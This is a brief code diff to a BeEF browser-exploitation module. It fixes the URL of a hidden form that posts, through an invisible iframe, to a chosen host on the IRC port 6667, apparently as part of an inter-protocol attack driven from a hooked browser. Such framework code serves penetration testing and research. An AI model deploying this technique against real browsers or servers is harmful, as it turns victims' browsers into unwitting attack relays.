@@ -25,7 +25,7 @@ beef.execute(function() {
     
   var myIframe = beef.dom.createInvisibleIframe();
   var myForm = document.createElement("form");
-  var action = connectto + ":6667/"
+  var action = "http://" + connectto + ":6667/"
  
   myForm.setAttribute("name", "data");
   myForm.setAttribute("method", "post");
